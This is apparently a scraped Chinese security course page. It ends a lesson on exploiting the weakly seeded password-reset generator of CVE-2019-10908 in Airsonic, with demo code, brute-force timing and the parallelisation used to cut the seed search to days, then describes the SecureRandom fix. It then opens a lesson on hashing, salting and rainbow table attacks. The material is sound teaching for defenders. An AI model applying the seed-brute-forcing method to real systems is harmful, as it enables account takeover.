<p>接下来我们从攻击种子的角度尝试进行漏洞利用，不过<strong>在判断对不对之前，要先判断是不是</strong>，因此在我们进行漏洞利用之前要先分析清楚是否真的存在这个漏洞。</p>

<p>首先来看一下Airsonic 10.2.1版本的源码：</p>

<pre><code class="language-java hljs"><span class="hljs-keyword">package</span> org.airsonic.player.controller;

<span class="hljs-comment">// ...</span>
<span class="hljs-keyword">import</span> org.apache.commons.lang.RandomStringUtils;
<span class="hljs-comment">// ...</span>

<span class="hljs-comment">// ...</span>
<span class="hljs-keyword">public</span> ModelAndView <span class="hljs-title function_">recover</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception {
    Map&lt;String, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String, Object&gt;();
    <span class="hljs-type">String</span> <span class="hljs-variable">usernameOrEmail</span> <span class="hljs-operator">=</span> StringUtils.trimToNull(request.getParameter(<span class="hljs-string">"usernameOrEmail"</span>));

    <span class="hljs-keyword">if</span> (usernameOrEmail != <span class="hljs-literal">null</span>) {
        map.put(<span class="hljs-string">"usernameOrEmail"</span>, usernameOrEmail);
        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> getUserByUsernameOrEmail(usernameOrEmail);

        <span class="hljs-type">boolean</span> captchaOk;
        <span class="hljs-keyword">if</span> (settingsService.isCaptchaEnabled()) {
            <span class="hljs-type">String</span> <span class="hljs-variable">recaptchaResponse</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">"g-recaptcha-response"</span>);
            <span class="hljs-type">ReCaptcha</span> <span class="hljs-variable">captcha</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReCaptcha</span>(settingsService.getRecaptchaSecretKey());
            captchaOk = recaptchaResponse != <span class="hljs-literal">null</span> &amp;&amp; captcha.isValid(recaptchaResponse);
        } <span class="hljs-keyword">else</span> {
            captchaOk = <span class="hljs-literal">true</span>;
        }

        <span class="hljs-keyword">if</span> (!captchaOk) {
            map.put(<span class="hljs-string">"error"</span>, <span class="hljs-string">"recover.error.invalidcaptcha"</span>);
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (user == <span class="hljs-literal">null</span>) {
            map.put(<span class="hljs-string">"error"</span>, <span class="hljs-string">"recover.error.usernotfound"</span>);
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (user.getEmail() == <span class="hljs-literal">null</span>) {
            map.put(<span class="hljs-string">"error"</span>, <span class="hljs-string">"recover.error.noemail"</span>);
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// 注释</span>
            <span class="hljs-comment">// 这行代码引入了潜在的安全风险</span>
            <span class="hljs-type">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> RandomStringUtils.randomAlphanumeric(<span class="hljs-number">8</span>);
<span class="hljs-comment">// ...</span>
</code></pre>

<p>根据代码段中我添加的注释，我们继续分析RandomStringUtils：</p>

<pre><code class="language-java hljs"><span class="hljs-keyword">package</span> org.apache.commons.lang;

<span class="hljs-keyword">import</span> java.util.Random;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RandomStringUtils</span> {
    <span class="hljs-comment">// 注释1</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Random</span> <span class="hljs-variable">RANDOM</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>();

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">RandomStringUtils</span><span class="hljs-params">()</span> {
    }
    <span class="hljs-comment">// ...</span>
    <span class="hljs-comment">// 注释2</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">randomAlphanumeric</span><span class="hljs-params">(<span class="hljs-type">int</span> count)</span> {
        <span class="hljs-keyword">return</span> random(count, <span class="hljs-literal">true</span>, <span class="hljs-literal">true</span>);
    }
    <span class="hljs-comment">// ...</span>
    <span class="hljs-comment">// 老师加的注释3</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">random</span><span class="hljs-params">(<span class="hljs-type">int</span> count, <span class="hljs-type">int</span> start, <span class="hljs-type">int</span> end, <span class="hljs-type">boolean</span> letters, <span class="hljs-type">boolean</span> numbers, <span class="hljs-type">char</span>[] chars, Random random)</span> {
    <span class="hljs-comment">// ...</span>
</code></pre>

<p>在注释1部分，可以看到RandomStringUtils类在调用过程中会创建一个静态的成员变量RANDOM，在应用运行过程中，这个变量会一直存在。</p>

<p>在注释2部分，是randomAlphanumeric的函数实现，不断追踪函数调用栈可以发现最终调用了注释3部分的函数，而调用过程最后一个函数参数即是注释1部分创建的RANDOM变量，这一调用过程意味RANDOM是唯一一组随机数序列，只要我们判断出RANDOM序列即可执行攻击。</p>

<p>那么顺着思路，我们继续分析关键点——RANDOM。RANDOM是通过Random()创建的java.util.Random对象。如下是直接调用<code>Random()</code>生成新对象时的代码：</p>

<pre><code class="language-java hljs"><span class="hljs-keyword">public</span> <span class="hljs-title function_">Random</span><span class="hljs-params">()</span> {
    <span class="hljs-built_in">this</span>(seedUniquifier() ^ System.nanoTime());
}

<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">seedUniquifier</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// L'Ecuyer, "Tables of Linear Congruential Generators of</span>
    <span class="hljs-comment">// Different Sizes and Good Lattice Structure", 1999</span>
    <span class="hljs-keyword">for</span> (;;) {
        <span class="hljs-type">long</span> <span class="hljs-variable">current</span> <span class="hljs-operator">=</span> seedUniquifier.get();
        <span class="hljs-type">long</span> <span class="hljs-variable">next</span> <span class="hljs-operator">=</span> current * <span class="hljs-number">1181783497276652981L</span>;
        <span class="hljs-keyword">if</span> (seedUniquifier.compareAndSet(current, next))
            <span class="hljs-keyword">return</span> next;
    }
}
</code></pre>

<p>可以看到在Random()函数内部执行了种子值的设置，而具体种子值的计算则是由一段数学运算得出。</p>

<p>接下来我们尝试写一个Demo程序，来搭建一个最简单的环境进行安全性分析：</p>

<pre><code class="language-java hljs"><span class="hljs-keyword">import</span> org.apache.commons.lang.RandomStringUtils;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        System.out.println(<span class="hljs-string">"Hello World!"</span>);

        <span class="hljs-type">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> RandomStringUtils.randomAlphanumeric(<span class="hljs-number">8</span>);

        System.out.println(password);
    }
}
</code></pre>

<p>开启调试模式，然后断点下在Random()函数内部，通过IDEA集成的Expression查看功能，我们来看一下Random()所设置的种子值大概长什么样子：</p>

<p><img src="assets/4d4a667238c1494e992733a537f3fe9b.jpg" alt="图片"></p>

<p>通过多次执行Demo程序，我们可以发现seedUniquifier()的取值序列每次都是相同的，以下是我通过调试模式取出的数值：</p>

<pre><code class="language-plain">8006678197202707420
-3282039941672302964
3620162808252824828
</code></pre>

<p>考虑到种子值是由<code>seedUniquifier() ^ System.nanoTime()</code>计算得出，而<code>seedUniquifier()</code>的取值序列固定，因此种子值将取决于<code>System.nanoTime()</code>函数。继续通过Expression查看功能：</p>

<p><img src="assets/112ff25188024a01b08000df153f9015.jpg" alt="图片"></p>

<p>启用二进制模式查看：</p>

<p><img src="assets/9ae42364a493453399c97f5d34cc1a6f.jpg" alt="图片"></p>

<p>可以发现<code>System.nanoTime()</code>的取值空间为48bit，取值范围为<code>2^48=281474976710656≈2.8x10^14</code>，这看起来并不是一个很大的数字，直观上存在爆破的可能性。那么我们再简单修改一下Demo程序，看一下我们电脑的算力如何：</p>

<pre><code class="language-java hljs"><span class="hljs-keyword">import</span> org.apache.commons.lang.RandomStringUtils;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// write your code here</span>
        System.out.println(<span class="hljs-string">"Hello World!"</span>);

        <span class="hljs-type">long</span> <span class="hljs-variable">startTime</span> <span class="hljs-operator">=</span> System.nanoTime();

        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100000000</span>; i++) {
            <span class="hljs-type">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> RandomStringUtils.randomAlphanumeric(<span class="hljs-number">8</span>);
        }

        <span class="hljs-type">long</span> <span class="hljs-variable">duringTime</span> <span class="hljs-operator">=</span> System.nanoTime() - startTime;

        System.out.println(duringTime);
        System.out.println(duringTime / <span class="hljs-number">1000000000.0</span>);
    }
}
</code></pre>

<p>如下是执行结果：</p>

<pre><code class="language-plain">Hello World!
13950490348
13.950490348

Process finished with exit code 0
</code></pre>

<p>简单总结一下就是按照这个程序的执行速度，进行100000000也就是10^8次运算需要13.95秒。</p>

<p>有了这些基本数据，就很好进行分析了，简单的除法运算就能够分析清楚爆破所需时间：</p>

<pre><code class="language-plain">2.8x10^14 / 10^8 * 13.95 = 3.9x10^7 秒 = 10833小时 = 451天
</code></pre>

<p>虽然找到了攻击方案，并且根据算力情况评估出了攻击成本，但很明显这个耗时有些过长了，真实场景很难实施，因此<strong>我们需要想办法降低时间消耗</strong>。</p>

<p>既然考虑到了效率优化，就需要关注一下我们上面所构建的Demo程序是否已经实现效率最大化。从代码逻辑上来看，很明显Demo程序是一个单进程单线程应用，可是我的电脑的CPU核心应该是8核16线程，因此我们可以从这个角度入手去提升它的效率优化空间。从Demo程序执行时的CPU占用率也可以看得出，在运行期间事实上仅有一个核心达到了100%占用：</p>

<p><img src="assets/a69d3d235df04954a52cf0a407cd7caf.jpg" alt="图片"></p>

<p>于是我决定优化一下程序执行逻辑，并预期可以取得16倍的性能提升：</p>

<pre><code class="language-java hljs"><span class="hljs-keyword">package</span> org.example;

<span class="hljs-keyword">import</span> org.apache.commons.lang.RandomStringUtils;

<span class="hljs-keyword">import</span> java.util.Random;
<span class="hljs-keyword">import</span> java.util.stream.IntStream;
<span class="hljs-keyword">import</span> java.time.Instant;
<span class="hljs-keyword">import</span> java.time.Duration;
<span class="hljs-keyword">import</span> java.security.SecureRandom;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-keyword">if</span> (args.length != <span class="hljs-number">2</span>) {
            System.out.println(<span class="hljs-string">"must be 2 arguments"</span>);
            <span class="hljs-keyword">return</span>;
        }
        <span class="hljs-type">int</span> <span class="hljs-variable">from</span> <span class="hljs-operator">=</span> Integer.parseInt(args[<span class="hljs-number">0</span>]);
        <span class="hljs-type">int</span> <span class="hljs-variable">to</span> <span class="hljs-operator">=</span> Integer.parseInt(args[<span class="hljs-number">1</span>]);
        System.out.println(<span class="hljs-string">"from "</span> + from + <span class="hljs-string">" to "</span> + to);
        System.out.println(Runtime.getRuntime().availableProcessors());

        eval(<span class="hljs-string">"sequential"</span>, () -&gt; {
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">100000000</span>; i++) {
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">RandomStringUtilsTest</span>(i).randomAlphanumeric(<span class="hljs-number">8</span>);
            }
        });

        eval(<span class="hljs-string">"parallel"</span>, () -&gt; {
            IntStream.range(<span class="hljs-number">0</span>, <span class="hljs-number">100000000</span>).parallel().forEach(i -&gt; <span class="hljs-keyword">new</span> <span class="hljs-title class_">RandomStringUtilsTest</span>(i).random(<span class="hljs-number">8</span>));
        });
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">eval</span><span class="hljs-params">(String task, Runnable runnable)</span> {
        <span class="hljs-type">Instant</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> Instant.now();
        runnable.run();
        <span class="hljs-type">Instant</span> <span class="hljs-variable">end</span> <span class="hljs-operator">=</span> Instant.now();
        System.out.printf(<span class="hljs-string">"%s spend %s%n"</span>, task, Duration.between(start, end));
    }
}
</code></pre>

<p>从输出结果可以发现并行计算下的效率大约是串行计算的16倍：</p>

<pre><code class="language-java hljs">from <span class="hljs-number">1</span> to <span class="hljs-number">100000</span>
<span class="hljs-number">16</span>
sequential spend PT15.235S
parallel spend PT1.826S

Process finished with exit code <span class="hljs-number">0</span>
</code></pre>

<p>再观察一下执行期间的CPU占用，可以发现CPU确实是全核心在运行的。</p>

<p><img src="assets/ed2b315a15ac40358b84251bf0e12414.jpg" alt="图片"></p>

<p>这里仅以我的个人计算机为例进行模拟攻击的时间测算，在实际应用场景中，我们完全可以通过调度云端计算机使上百核心的并发计算，我们以128核心为例：</p>

<pre><code class="language-java hljs"><span class="hljs-number">451</span>天 / <span class="hljs-number">128</span> ≈ <span class="hljs-number">3.5</span>天
</code></pre>

<p>可以发现在上面这种情况下，我们只需要3.5天即可完成针对该漏洞的攻击。</p>

<p>值得展开讨论的是，虽然在上述情况中我们可以成功进行攻击，但是实际情况往往会更加复杂，比如我们已知的随机数已经是生成的第几百个随机数，这种情况下由于需要产生较长的随机数序列进行匹配，将会导致更大的计算量。但是这种计算量增长都是线性的，我们仍然可以根据需求选择能够负载的时间和金钱成本，顺利完成攻击。</p>

<h2 id="安全实践">安全实践</h2>

<p>以<strong>CVE-2019-10908</strong>为例，我们来看一下开源项目的修复方案。</p>

<p>首先从包的使用方面，取消了<code>org.apache.commons.lang.RandomStringUtils</code>的使用，并且替换为<code>java.security.SecureRandom</code>，根据名字很容易判断新替换的包是一个密码学安全的伪随机数生成器，该随机数生成器从算法设计角度上是密码学安全的，同时内部所使用的种子值强度也会更高。</p>

<p>然后在代码实现层面，放弃了原有的<code>RandomStringUtils.randomAlphanumeric</code>函数，转为使用新的代码实现：</p>

<pre><code class="language-java hljs">    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">SYMBOLS</span> <span class="hljs-operator">=</span> <span class="hljs-string">"abcdefghi jklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">SecureRandom</span> <span class="hljs-variable">random</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecureRandom</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">PASSWORD_LENGTH</span> <span class="hljs-operator">=</span> <span class="hljs-number">32</span>;
    <span class="hljs-comment">// ...</span>
    <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(PASSWORD_LENGTH);
    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;PASSWORD_LENGTH; i++) {
        <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> random.nextInt(SYMBOLS.length());
        sb.append(SYMBOLS.charAt(index));
    }
    <span class="hljs-type">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> sb.toString();
</code></pre>

<p>简单来说，就是在开发过程中要通过安全的加密库来使用CPRNG。在不同语言中涉及的模块会有一些差异，比如Linux或者MacOS中，大部分加密库内部都依赖于<code>/dev/random</code>或<code>/dev/urandom</code>这两个随机源；在Windows中可以使用Crypto API或者BCryptGenRandom；在<code>C#</code>中可以使用System.Security.Cryptography.RandomNumberGenerator；在Python中可以使用os.urandom或secrets库；在Java中则可以使用我们本节课介绍的<code>java.security.SecureRandom</code>。</p>

<h2 id="总结">总结</h2>

<p>这节课我们学习了随机数相关的知识。</p>

<p>虽然物理世界充满了不确定性和随机性，但是计算机世界并非如此。计算机是一种执行确定计算过程的机器，我们在开发过程中使用的随机数基本都是由软件算法生成的伪随机数。但即使是伪随机数，也有安全和不安全之分。</p>

<p>常规的伪随机数生成器又称PRNG，是基于概率设计的；而为了保证安全则需要使用密码学意义上伪随机数生成器，这种生成器又叫CPRNG。这些经过PRNG或CPRNG生成的数字，可以理解为重复周期非常大的序列，因此能够满足随机性需求。而既然是序列，就一定会有一个开始，这个开始值的产生由种子值确定，这个种子我们又称之为seed。</p>

<p>在考虑到PRNG以及CPRNG算法安全的情况下，种子值的安全成为了关键要素，因为一旦种子值可以被预测则生成的所有随机数都将可以被预测。由此引发的一系列安全风险包括无效的随机数、小空间种子值以及非密码学安全的随机数生成器等。</p>

<p>虽然围绕密码学和随机数展开的攻击案例并不多见，但是本节课我们以CVE-2019-10908为例进行了真实的随机数层面的攻击，从实战过程可以发现这类攻击要求攻击者具备足够深厚的密码学和随机数相关的知识，同时需要具备一定的开发功底。正因如此，许多开发者并未重视这类安全问题，与CVE-2019-10908相似的安全风险仍普遍存在于许多应用中。</p>

<p>关于随机数方面的安全建议，仍然可以参考CVE-2019-10908的开源项目更新方案，从安全库的使用及随机数生成过程两个方面共同优化。</p>

<p>也许你会觉得本节课程中涉及的漏洞利用过程稍有复杂，不过别担心，随着课程的不断更新，在后续课程中你将学会搭建和使用属于自己的个性化智能攻防对抗系统，这将大幅度降低类似攻击过程的复杂度及难度，让你的安全能力持续积累、快速提高。</p>

<h2 id="思考">思考</h2>

<p>本节课我们以CVE-2019-10908为例研究了随机数攻击中的种子爆破攻击，你可以尝试从PRNG v.s. CPRNG的角度分析其安全缺陷吗？</p>

<p>欢迎你在评论区留下自己的思考，我们下节课再见。</p>
</div>
                        </div><div class="book-post">
                            
                            <div align="center">因收到Google相关通知，网站将会择期关闭。<a target="_blank" href="https://lumendatabase.org/notices/44265620">相关通知内容</a><hr></div>
                            
                            <p id="tip" align="center"></p>
                            <h1 id="title" data-id="11 忘记加“盐”：加密结果强度不够吗？" class="title">11 忘记加“盐”：加密结果强度不够吗？</h1>
                            <div><p>你好，我是王昊天。今天我来和你一起来聊聊“盐”。</p>

<p>什么是盐？</p>

<p>食盐是一种调味品，可以在烹饪食物时添加到菜肴中，给寡淡的食材增添风味。恰好我对烹饪也有一点研究，所以对食盐的作用也稍有理解。食盐是菜品中咸味的主要来源，在烹饪中加入适量的食盐，一方面可以提鲜，另一方面也可以去除掉原料的一些异味。</p>

<p>那么盐和安全有什么关系呢？</p>

<p>盐又称为Salt，在密码学中我们常常会用到散列算法对字符串进行处理，散列算法可以为数据创建相对精简的数据指纹，具体我们会在后面详细介绍。为了提高安全性，<strong>在进行散列操作之前会对字符串进行一些拼接、混淆操作，这个过程我们就称为“加盐”</strong>。虽然不知道“加盐”的本意是否如此，但加盐处理字符串的过程与使用盐处理食物的过程非常相似，<strong>一方面去除了字符串本身的特征，另一方面增强了字符串的复杂度。</strong></p>

<p>经过加盐处理的散列结果与未加盐处理的散列结果，极大概率是不相同的，这一过程大大提高了散列算法的安全性。</p>

<h2 id="hash">HASH</h2>

<p>在了解调味品该如何使用之前，我们要先了解原材料是什么。因此，在了解如何用盐之前，我们先来了解HASH函数是什么。</p>

<p><strong>HASH函数，又称散列函数，是为一段数据创建数字指纹的方法，创建生成的数字指纹叫散列值。</strong>由于经过了压缩，它的长度较原始输入短了很多，因此我们也称之为摘要。</p>

<p>由HASH函数计算出来的散列值<strong>具有不可逆的特性</strong>，这里说的不可逆，是指攻击者无法从散列值进行逆向推导，进而获得原始输入。得益于不可逆特性，在Web业务系统开发过程中，我们通常使用散列值作为用户密码存储进数据库。在这种情况下，Web业务系统既可以校验用户密码的正确性，又无法真正得知用户密码明文。</p>

<p><strong>HASH的应用</strong></p>

<p>HASH函数具备很多优秀的特性，比如计算不可逆、难以伪造、数据压缩等，因此它具备很多应用场景。</p>

<p><strong>基于计算不可逆和难以伪造这两个优秀的安全特性，HASH函数的一个主要应用场景，就是校验数据传递的完整性。</strong>将要传递的数据作为HASH函数的输入，生成散列值A；再在接收端将A作为HASH函数的输入，生成散列值B。通过对比A和B，就可以快速判断出数据传输的完整性和数据的真实性。</p>

<p>许多官方发布的应用、开发组件和二进制可执行程序，都会在下载链接旁边附上对应的散列值，方便终端用户在下载完成之后进行对比。这种方式可以保证终端用户，即使遭遇了DNS污染，中间人攻击，或者官方遭遇入侵导致安装包被替换的情况，也可以清晰地判断出恶意应用。</p>

<p>这是一个我经常玩的游戏（没有收广告费），在官网下载链接页面可以看到提供的MD5散列值：</p>

<p><img src="assets/f5880c5b3e9a475b895194a790e8cc17.jpg" alt="图片"></p>

<p>下载之后要如何操作呢？其实是非常简单的，以Mac OS为例，在Terminal里已经集成了md5命令，我们可以通过md5命令快速计算出一个文件的md5散列值，将其与官网展示的散列值进行对比即可：</p>

<p><img src="assets/b45e945738444c2b815ac45d745593a7.jpg" alt="图片"></p>

<p><strong>基于数据压缩特性，则会有散列表和错误校正等应用场景。</strong></p>

<p>散列表是一种开发中常用的技术手段，它通常被用来根据关键字快速查找数据记录。比较形象的例子是字典，它的关键词是英文单词，而完整的记录则包含了单词的拼写、音标、解释以及例句，这个场景可以理解为一种，从完整的数据记录到单词的映射关系。</p>

<p><img src="assets/fda877ed853d467fb3ad9275593c611c.jpg" alt="图片"></p>

<p>错误校正，是开发中常用的另一种技术手段，在数据传输、存储的过程中经常会用到。在数据传输、存储的过程中，由于信号的干扰、物理介质的不稳定性等原因，经常会出现数据错误的情况。这时，我们可以通过计算散列值的方法来判断数据完整性，这种方案就称为<strong>冗余校验</strong>。更进一步，我们甚至可以通过定义不同的HASH函数，使得冗余校验具备纠错能力。</p>

<h2 id="盐">盐</h2>

<p>用户账户认证过程，通常涉及到密码的存储，<strong>这就是盐的主要应用场景之一</strong>。</p>

<p>我们都知道，密码的存储通常是放在数据库中，关于密码的存储形态有很多种，通常可选的方案包括明文、散列值等。</p>

<p>如果采用明文存储的方案，一旦发生了入侵事件，或者系统存在漏洞使得数据库外泄，就会导致大规模的用户账户外泄，这种安全事件是灾难性的。所以目前大部分系统采取的方案都是存储散列值，在这种情况下，即使是系统也无法得知用户的密码是什么。</p>

<p>通常在采用存储散列值的情况下，系统会通过比较散列值来认证用户。系统通过用户输入获得密码后，会让密码经过HASH函数处理产生一个散列值，并将该散列值与存储在数据库中的散列值进行对比，如果相同则表示认证成功。</p>

<p>我们可以设想一下，在这种方案下，即使黑客通过漏洞成功获得了数据库内的全部数据，他获得的，也仅仅是密码经过HASH函数运算得出的散列值，而这个散列值并不能够帮助他登录系统。</p>

<h2 id="暴力破解和字典攻击">暴力破解和字典攻击</h2>

<p>为了达到登录的目的，黑客必须找到一段数据，这段数据的HASH运算结果需要与黑客获得的散列值一致。<strong>此时黑客可选的方案是暴力破解、字典攻击和彩虹表攻击。</strong></p>

<p>这三种攻击方式执行的难度由简单到困难，效果也是从差到好。暴力破解和字典攻击的实施过程都非常简单，<strong>基本思路都是通过遍历用户密码所有取值来直接找到答案，区别是暴力破解采用遍历的方式是实时计算，而字典攻击会根据预先计算好的结果直接查找。</strong>虽然这两种方案执行上非常简单，但实际操作效果却并不理想，主要原因是用户密码的取值空间过于庞大。</p>

<p>这里我们通过简单的计算，来对取值空间有一个更加直观的认识。一般用户密码的单字符可选范围是26个小写字母、26个大写字母、10个数字以及少数特殊字符，我们假设用户密码是8位（要知道8位密码并不算强度很高的设置），那么经过计算，密码合计取值范围就是72万亿。</p>

<pre><code class="language-plain">单字符取值范围 ≈ 26 + 26 + 10 + 10 = 72
8个字符的密码取值空间 = 72 ^ 8 = 722204136308736 ≈ 72万亿
</code></pre>

<p>按照每秒能够计算100万个密码的散列值来计算，需要大约8358天，相当于22.9年才能完成密码空间的遍历，很显然这种攻击是无法真正实施的，<strong>因此暴力破解攻击无效</strong>。</p>

<pre><code class="language-plain">722204136308736 / (1000000 * 3600 * 24) ≈ 8358
</code></pre>

<p>按照每个8位密码占据8个字节的存储空间来计算，72万亿的密码空间大约会占据5254TB的存储空间，很显然这种攻击也是无法真正实施的，<strong>因此字典攻击也是无效的</strong>。</p>

<pre><code class="language-plain">722204136308736 * 8.0 / (1024 * 1024 * 1024 * 1024) ≈ 5254
</code></pre>

<p>综合上面的分析，我们可以发现，暴力破解没有空间占用但时间消耗过大，而字典攻击几乎没有时间占用但空间消耗过大。因此，为了有效地对散列值进行攻击，我们需要一种更可行的方案。在这种方案里，我们能够接受多一些的解密时间，但希望它不要占用过大的空间。目前，这种平衡了时间和空间的攻击方案就是<strong>彩虹表攻击</strong>。</p>

<h2 id="彩虹表攻击">彩虹表攻击</h2>

<h3 id="hash链">HASH链</h3>

<p>以字典攻击为基础，通过算法设计来实现时间换取空间的效果，就是彩虹表攻击的原理。</p>

<p>彩虹表攻击中所涉及的算法就是<strong>预计算的HASH链</strong>。</p>

<p>为了实现预计算的HASH链，我们需要一个新型函数的辅助，一般会称之为归约函数或者约简函数。但是千万不要为这个名字感到困惑，它其实并没有真实地表达什么含义，你可以简单地理解为一个新函数R。<strong>R函数与HASH函数执行相反的运算流程</strong>，比如，HASH函数将原始输入映射到HASH散列值，而R函数则是将HASH散列值映射回原始输入，并且R函数的映射关系是可以任意指定的。</p>

<p>接下来我来带你实际构建一个HASH链，在这个过程中，你将对稍显复杂的彩虹表攻击有更直观的理解。</p>

<p>以MD5散列为例，首先我们随机选择一段明文<code>talentsec</code>并对其取md5散列，获得结果<code>6f66114d09e7b9ddbfa8b286ea1e57a7</code>，接下来我们按照自己的喜好定义一个R函数，并且使用R函数对散列值<code>6f66114d09e7b9ddbfa8b286ea1e57a7</code>进行运算，获得结果<code>aaaaaaaaa</code>。继续重复上述过程，即不断使用HASH函数和R函数进行计算，产生的如下链条就是HASH链：</p>

<p><img src="assets/6396184a25524d849f9d1c72d6ac48ee.jpg" alt="图片"></p>

<p>通过随机选择多段明文重复执行这个过程，会产生多个HASH链，这些HASH链我们称为预计算的HASH链集。需要注意的是，存储的过程中我们只需要保存HASH链的头和尾，对于上述示例HASH链，我们只进行了2轮计算，所以其存储形态应该是<code>(talentsec,bbbbbbbbb)</code>。</p>

<p>那么我们要如何使用预计算的HASH链来进行攻击呢？</p>

<p>作为攻击者，我们需要破解一个HASH散列值。通过对该散列值进行多轮次的R函数、HASH函数计算，我们可以取得多个原始输入，如果原始输入与HASH链的头或者尾产生碰撞，HASH散列值的破解结果则很有可能存在于该链条中。</p>

<p>这里我们通过2个场景示例来直接感受一下，对于上述场景，如果我们希望破解的散列值是<code>552e6a97297c53e592208cf97fbb3b6</code>，通过1次R函数可以获得原始输入<code>bbbbbbbbb</code>，成功匹配到HASH链<code>(talentsec,bbbbbbbbb)</code>，通过从头执行HASH链的计算过程，可以得出破解结果是<code>aaaaaaaaa</code>；同样是上述场景，如果我们希望破解的散列值是<code>6f66114d09e7b9ddbfa8b286ea1e57a7</code>，通过R函数-HASH函数-R函数计算可以获得原始输入<code>bbbbbbbbb</code>，依然成功匹配到HASH链<code>(talentsec,bbbbbbbbb)</code>，通过从头执行HASH链的计算过程，可以得出破解结果是<code>talentsec</code>。</p>

<p><img src="assets/9a9ef2a1bbd8424fbce1ff81fc1c7134.jpg" alt="图片"></p>

<p>值得一提的是，破解中需要的运算轮次，一般与HASH链的计算轮次相同，如果达到了计算轮次却并未找到匹配的HASH链，则直接返回破解失败。</p>

<p>关于预计算HASH链的理想性能表现，我们可以通过简单的计算来分析。依然是8位密码的情况，假设我们定义了一个R函数，让每条HASH链能够执行1亿次计算，那么完成HASH链集的存储只需要大约220MB的空间。</p>

<pre><code class="language-plain">722204136308736 / 50000000 ≈ 14444082 条HASH链
722204136308736 * 16 / (50000000 * 1024 * 1024) ≈ 220 MB
</code></pre>

<p>依然按照每秒100万次的速度来计算，单一HASH散列值从生成一条新的HASH链到完成匹配的时间预计不超过2分钟。</p>

<pre><code class="language-plain">100000000 / (1000000 * 60) ≈ 1.67 mins
</code></pre>

<h3 id="彩虹表">彩虹表</h3>

<p>那么，预计算的HASH链集就是彩虹表吗？其实并非如此。</p>

<p>预计算的HASH链集仍然存在着一些不足，主要是在性能表现方面。我们刚刚计算的攻击时间都是在理想情况下推演出来的，但是未经优秀设计就生成的预计算HASH链集，实际上并不能达到这个性能水平，因此才会出现彩虹表。<strong>我们可以将彩虹表理解为是一种经过精密设计的预计算HASH链集，在攻击时能发挥出理想的性能表现。</strong></p>

<p>那么预计算HASH链集需要优化的核心点是哪里呢？接下来我们就一起来分析一下。</p>

<p>通过前面我们所讨论的攻击过程，不难判断，<strong>预计算的HASH链集包含多条HASH链</strong>，这一点我们从它的名字也不难看出，而每条HASH链能够覆盖的攻击范围，与它执行的计算次数呈现线性相关。最理想的情况当然是，每条HASH链所覆盖的攻击范围彼此互斥，这样在n条链的情况下，覆盖的攻击范围就是<code>n x 单链计算次数/2</code>。但现实往往没有这么理想，R函数的选择与设计可能会导致碰撞情况的发生：</p>

<p><img src="assets/47d7834e13064024bea1f01ced1b9d58.jpg" alt="图片"></p>

